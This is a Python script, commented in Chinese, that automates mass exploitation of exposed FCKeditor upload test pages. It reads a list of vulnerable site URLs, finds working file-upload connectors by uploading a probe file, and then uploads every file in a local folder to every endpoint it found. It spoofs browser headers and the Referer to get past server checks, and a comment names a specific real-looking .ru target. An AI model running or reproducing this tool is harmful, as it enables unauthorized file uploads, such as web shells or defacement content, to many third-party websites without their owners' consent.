#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import logging
import os
import re
from pathlib import Path
from typing import List, Optional

import requests
from bs4 import BeautifulSoup  # 需要: pip install beautifulsoup4
from datetime import datetime


# 从笔记本迁移的 URL 参数映射
URL_PARAM_MAP = {
    # http://spanishrestaurant.ru/fckeditor/editor/filemanager/upload/test.html
    "default/connectors/test.html": {
        "param": "Command=FileUpload&Type=File&CurrentFolder=%2F",
    },
    "filemanager/connectors/test.html": {
        "param": "Command=FileUpload&Type=File&CurrentFolder=%2F",
    },
    "connectors/uploadtest.html": {
        "param": "time={timestamp}&Type=File",
    },
    "upload/test.html": {
        "param": None,
    },
}


def parse_onupload_list(text: str) -> List[str]:
    """解析 window.parent.OnUploadCompleted(...) 的参数为 Python 列表。

    返回示例: ["0", "/images/tmp/xxx", "filename.ext", ""]
    """
    m = re.search(r"OnUploadCompleted\s*\((.*?)\)", text, flags=re.S | re.I)
    if not m:
        return []
    arg_str = m.group(1).strip()

    args: List[str] = []
    buf: List[str] = []
    in_str = False
    quote: Optional[str] = None
    esc = False

    for ch in arg_str:
        if in_str:
            if esc:
                buf.append(ch)
                esc = False
            elif ch == "\\":
                esc = True
                buf.append(ch)
            elif ch == quote:
                in_str = False
                buf.append(ch)
            else:
                buf.append(ch)
        else:
            if ch in ("'", '"'):
                in_str = True
                quote = ch
                buf.append(ch)
            elif ch == ',':
                arg = ''.join(buf).strip()
                if arg:
                    if len(arg) >= 2 and arg[0] in '"\'' and arg[-1] == arg[0]:
                        val = bytes(arg[1:-1], 'utf-8').decode('unicode_escape')
                        args.append(val)
                    else:
                        args.append(arg)
                buf = []
            else:
                buf.append(ch)

    if buf:
        arg = ''.join(buf).strip()
        if len(arg) >= 2 and arg[0] in '"\'' and arg[-1] == arg[0]:
            val = bytes(arg[1:-1], 'utf-8').decode('unicode_escape')
            args.append(val)
        elif arg:
            args.append(arg)

    return args


def upload_file(url: str, file_path: Path, timeout: int = 60) -> List[str]:
    """向指定上传端点提交文件。成功返回 OnUploadCompleted 的参数列表，否则抛异常。"""
    if not file_path.is_file():
        raise FileNotFoundError(f"文件不存在: {file_path}")

    # 构建必要的请求头，模拟浏览器行为
    base_url = "/".join(url.split("/")[:-1])  # 获取基础 URL 用作 Referer
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Referer": f"{base_url}/uploadtest.html",  # 重要：服务器检查 Referer
        "Origin": "/".join(url.split("/")[:3]),  # 获取域名作为 Origin
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
    }

    filename = file_path.name
    with file_path.open("rb") as f:
        files = {"NewFile": (filename, f, "application/octet-stream")}
        resp = requests.post(url, files=files, headers=headers, timeout=timeout)
    
    if resp.status_code == 200 and resp.text:
        parsed = parse_onupload_list(resp.text)
        if parsed and parsed[0] == '0' or parsed[0]== '201':
            return parsed
        raise Exception(f"上传失败: {resp.status_code},{resp.text}")
    raise Exception(f"上传失败: {resp.status_code},{resp.text}")


def get_upload_url(base_url: str, sample_file: Path, timeout: int = 60) -> Optional[str]:
    """从 FCKeditor 测试页推断有效的上传端点 URL。

    策略:
    - 请求 base_url，解析页面中的 <select><option> 的 value
    - 选取包含 "upload" 或 "connectors" 的项，替换 base_url 最后一段
    - 根据 URL_PARAM_MAP 追加必要查询参数
    - 以 sample_file 实测，返回第一个可用端点
    """
    try:
        resp = requests.get(base_url, timeout=timeout)
        soup = BeautifulSoup(resp.text, "lxml") if resp.text else BeautifulSoup("", "lxml")
        params = None
        for key, value in URL_PARAM_MAP.items():
            if key in base_url:
                params = value["param"]
                break
        for select in soup.find_all("select"):
            for option in select.find_all("option"):
                option_value = option.get("value")
                if not option_value:
                    continue
                if ("upload" in option_value) or ("connectors" in option_value):
                    # 用 option_value 替换 URL 最后一段
                    last_segment = base_url.split('/')[-1]
                    candidate = base_url.replace(last_segment, option_value)
                    if params is not None:
                        # 生成毫秒级时间戳
                        timestamp = str(int(datetime.now().timestamp() * 1000))
                        params = params.replace("{timestamp}", timestamp)
                        candidate = f"{candidate}?{params}"
                    try:
                        # 以样例文件验证端点是否可用
                        upload_file(candidate, sample_file, timeout=timeout)
                        return candidate
                    except Exception as e:
                        logging.info(f"上传失败: {e}")
                        continue
    except Exception:
        # 忽略单个 URL 的解析错误，返回 None
        return None
    return None


def read_urls_from_file(path: Path) -> List[str]:
    """读取每行一个 URL 的文件，返回非空行列表。"""
    if not path.is_file():
        raise FileNotFoundError(f"找不到源文件: {path}")
    return [line.strip() for line in path.read_text(encoding="utf-8", errors="ignore").splitlines() if line.strip()]


def main() -> None:
    # 获取脚本所在目录，用于构建默认路径
    script_dir = Path(__file__).resolve().parent
    
    parser = argparse.ArgumentParser(description="FCKeditor 批量上传脚本 (从笔记本整理)")
    parser.add_argument("--src", default=str(script_dir / "vulurls_dedup.txt"), help="包含待探测测试页 URL 的文件路径 (每行一个)")
    parser.add_argument("--sample-file", default=str(script_dir / "hi.txt"), help="用于验证端点可用性的样例文件")
    parser.add_argument("--upload-folder", default=str(script_dir / "upload"), help="批量上传的本地文件夹路径")
    parser.add_argument("--timeout", type=int, default=60, help="HTTP 超时时间(秒)")
    args = parser.parse_args()

    # 初始化本次运行的日志文件（脚本同目录，使用当时时间戳命名）
    log_file_path = script_dir / f"fckeditor_uploader_{datetime.now().strftime('%Y%m%d-%H%M%S')}.log"
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
        handlers=[
            logging.FileHandler(log_file_path, encoding="utf-8"),
            logging.StreamHandler(),
        ],
    )
    logging.info("日志文件: %s", log_file_path)

    src_path = Path(args.src)
    sample_file = Path(args.sample_file)
    upload_folder = Path(args.upload_folder)

    urls = read_urls_from_file(src_path)
    logging.info("读取源文件完成: %s", urls)

    # 发现可用上传端点
    logging.info("开始查找可用上传端点")
    upload_urls: List[str] = []
    for u in urls:
        endpoint = get_upload_url(u, sample_file=sample_file, timeout=args.timeout)
        if endpoint is not None:
            upload_urls.append(endpoint)
    logging.info("可用上传端点: %s", upload_urls)
    logging.info("可用端点数量: %d", len(upload_urls))
    # 批量上传
    logging.info("开始批量上传")
    if upload_folder.is_dir():
        for file_path in upload_folder.glob("*"):
            if not file_path.is_file():
                continue
            for endpoint in upload_urls:
                try:
                    res = upload_file(endpoint, file_path, timeout=args.timeout)
                    logging.info("%s-%s 上传结果: %s", file_path, endpoint, res)
                except Exception as e:
                    logging.warning("%s-%s 上传失败: %s", file_path, endpoint, e)
    else:
        logging.error("上传目录不存在或不可读: %s", upload_folder)


if __name__ == "__main__":
    main()
